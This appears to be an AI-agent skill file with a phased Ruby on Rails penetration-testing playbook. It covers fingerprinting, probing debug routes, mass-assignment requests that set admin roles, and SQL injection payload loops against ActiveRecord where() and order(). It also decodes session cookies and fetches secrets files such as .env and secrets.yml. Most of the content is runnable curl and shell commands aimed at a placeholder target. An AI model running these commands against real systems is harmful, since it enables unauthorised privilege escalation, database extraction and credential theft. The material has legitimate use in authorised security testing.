---
name: framework-rails
description: "Ruby on Rails security testing — mass assignment via strong parameters bypass, YAML deserialization, SQL injection via ActiveRecord raw queries, debug routes, Rails secrets exposure, cookie tampering. Triggers: 'rails', 'ruby on rails', 'ror security', 'activerecord injection', 'rails mass assignment', 'ruby web pentest', 'rails secrets'."
---

# Ruby on Rails Security Testing

Rails attack surface: mass assignment, YAML deserialization, SQL via ActiveRecord, cookie secrets.

## Phase 1: Fingerprinting

```bash
TARGET="https://TARGET"

# Detect Rails
curl -sI "$TARGET" | grep -i "x-powered-by\|x-request-id\|_rails_session"
curl -s "$TARGET" | grep -i "csrf-token\|authenticity_token"

# Rails debug routes (development mode)
curl -s "$TARGET/rails/info/properties" | tee /workspace/output/rails-info.txt
curl -s "$TARGET/rails/info/routes" | tee /workspace/output/rails-routes.txt

# Common Rails paths
for path in /admin /users /api/v1 /health /status /sidekiq /letter_opener; do
  code=$(curl -so /dev/null -w "%{http_code}" "$TARGET$path")
  echo "$code $path"
done | tee /workspace/output/rails-paths.txt
```

## Phase 2: Mass Assignment

```bash
# User registration with extra params
curl -s -X POST "$TARGET/users" \
  -H "Content-Type: application/json" \
  -d '{"user":{"name":"attacker","email":"attacker@evil.com","password":"Password1","admin":true,"role":"admin"}}'

# Nested attributes bypass
curl -s -X PATCH "$TARGET/api/profile" \
  -H "Authorization: Bearer TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"user":{"name":"test","role":"admin","is_admin":"1","confirmed_at":"2020-01-01"}}'
```

## Phase 3: ActiveRecord SQL Injection

```bash
# Raw SQL via where()
# Vulnerable: User.where("name = '#{params[:name]}'")
for payload in "' OR '1'='1" "admin'--" "' UNION SELECT username,password,3 FROM users--"; do
  curl -s "$TARGET/users?name=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$payload'))")"
done

# order() injection (common Rails vuln)
for payload in "id ASC" "id,(SELECT 1 FROM pg_sleep(5))--" "id,EXTRACTVALUE(0,CONCAT(0x5c,(SELECT version())))"; do
  curl -s "$TARGET/users?sort=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$payload'))")"
done | tee /workspace/output/sqli-rails.txt
```

## Phase 4: YAML Deserialization

```bash
# Rails < 4.x used YAML for cookie serialization
# Generate payload with universal_rop_gadget
# ruby -e "require 'yaml'; puts YAML.dump({:method=>'system',:args=>['id']})"

# Test Rails session cookie tampering
SESSION=$(curl -sc /tmp/cookies.txt "$TARGET" && grep "_rails_session" /tmp/cookies.txt | awk '{print $7}')
echo "Session: $SESSION"

# Decode Rails session (base64)
echo "$SESSION" | base64 -d 2>/dev/null | python3 -m json.tool
```

## Phase 5: Secrets & Config Exposure

```bash
# Rails secrets/credentials
curl -s "$TARGET/config/secrets.yml"
curl -s "$TARGET/config/credentials.yml.enc"
curl -s "$TARGET/.env"

# Sidekiq web UI (often unprotected)
curl -s "$TARGET/sidekiq" -o /workspace/output/sidekiq.html

# LetterOpener (dev email preview)
curl -s "$TARGET/letter_opener" -o /workspace/output/letter-opener.html

# PgHero (database dashboard)
curl -s "$TARGET/pghero" -o /workspace/output/pghero.html

# Bullet gem debug info
curl -s "$TARGET" | grep -i "bullet\|n+1"
```

## Output

Save to `/workspace/output/`:
- `rails-routes.txt` — route listing
- `rails-info.txt` — properties page
- `sqli-rails.txt` — SQL injection results

## Next Phase

→ `vuln-mass-assignment` for detailed mass assignment exploitation
→ `vuln-deserialization` for YAML/Ruby deserialization payloads
